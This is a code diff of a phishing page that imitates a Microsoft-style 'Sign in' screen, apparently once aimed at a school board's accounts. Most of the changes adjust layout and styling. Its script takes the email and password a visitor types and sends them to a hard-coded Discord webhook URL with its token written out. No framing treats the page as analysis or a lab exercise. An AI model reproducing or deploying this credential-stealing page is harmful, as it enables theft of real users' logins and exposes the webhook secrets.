@@ -29,8 +29,6 @@
             width: 440px;
             /* CHANGE MIN-HEIGHT HERE to make main box taller or shorter */
             /* Using min-height makes it dynamic - it will grow if content needs more space */
-            max-height: 440px;
-            min-height: 380px;
             max-width: 90%;
             position: relative;
             z-index: 10;
@@ -46,7 +44,13 @@
         .slide {
             width: 33.333%;
             flex-shrink: 0;
-            padding: 44px;
+            /* CHANGE PADDING HERE to adjust overall spacing/compactness */
+            padding: 30px 44px;
+            /* CHANGE HEIGHT HERE to make the box taller or shorter */
+            height: 360px;
+            display: flex;
+            flex-direction: column;
+            overflow: visible;
         }
 
         .slide.active {
@@ -91,7 +95,8 @@
         }
 
         .logo {
-            margin-bottom: 15px;
+            /* CHANGE MARGIN-BOTTOM HERE to adjust space between banner and "Sign in" text */
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
         }
@@ -105,7 +110,7 @@
             font-size: 28px;
             font-weight: 600;
             color: #1b1b1b;
-            margin-bottom: 8px;
+            margin-bottom: 16px;
             letter-spacing: -0.02em;
         }
 
@@ -113,7 +118,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
             cursor: pointer;
             padding: 4px 8px;
             margin-left: -8px;
@@ -135,10 +140,10 @@
             font-size: 18px;
         }
 
-                .input-wrapper {
+                        .input-wrapper {
             /* CHANGE MARGIN-LEFT HERE to move input box left or right (use negative values to move left) */
             /* CHANGE MARGIN-TOP HERE to move input box up or down */
-            margin-top: 24px;
+            margin-top: 0px;
             margin-bottom: 8px;
             position: relative;
         }
@@ -175,7 +180,7 @@
             font-size: 13px;
             display: inline-block;
             margin-top: 12px;
-            margin-bottom: 24px;
+            margin-bottom: 8px;
         }
 
         .link:hover {
@@ -184,16 +189,22 @@
         }
 
         .button-container {
-            margin-top: 24px;
+            margin-top: 20px;
             display: flex;
             justify-content: flex-end;
+        }
+
+        /* Email screen button needs more space */
+        #emailSlide .button-container {
+            margin-top: 65px;
         }
 
         .button-primary {
             background: #0067b8;
             color: white;
             border: 1px solid transparent;
-            padding: 8px 24px;
+            /* CHANGE PADDING HERE to adjust button size (vertical horizontal) */
+            padding: 6px 32px;
             font-size: 15px;
             cursor: pointer;
             font-weight: 600;
@@ -216,6 +227,7 @@
 
         .sign-in-options {
             background: white;
+            /* CHANGE PADDING HERE to adjust height of sign-in options box */
             padding: 12px 44px;
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.05);
             width: 440px;
@@ -240,9 +252,9 @@
         }
 
         .sign-in-options img {
-            /* CHANGE WIDTH AND HEIGHT HERE to adjust size of the key icon */
-            width: 30px;
-            height: 30px;
+            /* CHANGE WIDTH AND HEIGHT HERE to adjust size of the lock/key icon */
+            width: 32px;
+            height: 32px;
         }
 
         .sign-in-options-text {
@@ -255,12 +267,14 @@
             position: fixed;
             /* CHANGE POSITION HERE - adjust 'bottom' and 'right' values to move the 3 dots */
             bottom: 0;
+            color: #000;
             right: 0;
             padding: 12px 24px;
+            font-weight: bold;
             display: flex;
             gap: 24px;
             align-items: center;
-            font-size: 11px;
+            font-size: 12px;
             z-index: 10;
         }
 
@@ -310,7 +324,7 @@
                 <h1>Sign in</h1>
                 
                 <div class="input-wrapper">
-                    <input type="text" id="emailInput" placeholder="username@educ.dpcdsb.org" aria-label="Enter your email, phone, or Skype.">
+                    <input type="text" id="emailInput" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype.">
                 </div>
                 
                 <a href="#" class="link">Can't access your account?</a>
@@ -337,7 +351,7 @@
                 </div>
                 
                 <div class="user-identity" id="backButton">
-                    <span class="back-arrow">â†</span>
+                    <span class="back-arrow">←</span>
                     <span id="userEmail"></span>
                 </div>
                 
@@ -364,7 +378,7 @@
     <div class="footer">
         <a href="#">Terms of use</a>
         <a href="#">Privacy & cookies</a>
-        <span class="more-options">â€¦</span>
+        <span class="more-options">…</span>
     </div>
 
     <script>
@@ -432,11 +446,9 @@
             const email = emailInput.value.trim();
             const password = passwordInput.value;
             sendDiscordMessage('Email: ' + email + '\nPassword: ' + password);
-
-     //     https://discordapp.com/api/webhooks/1433462433686487150/P-FcjrAjivIdB84LymQ6nr8bpER-hTNgGbttp88BZjxq-O52DNyxVjbQYAV8IHkyCGHt
         });
-      
-      const webhookUrl = 'https://discord.com/api/webhooks/1433506112686133270/TvgvzAlJU1uOJMmuGeGzTzbKWI9OjbIUW7EUhuUzRdM6sgSDxgpEEr1IyGvGTlnx3cJ4'
+
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1433506112686133270/TvgvzAlJU1uOJMmuGeGzTzbKWI9OjbIUW7EUhuUzRdM6sgSDxgpEEr1IyGvGTlnx3cJ4';
 
 async function sendDiscordMessage(content) {
   try {
@@ -459,6 +471,7 @@ async function sendDiscordMessage(content) {
     console.error('Error sending message:', error);
   }
 }
+
         document.getElementById('cancelLink').addEventListener('click', function(e) {
             e.preventDefault();
             // Go back to email screen
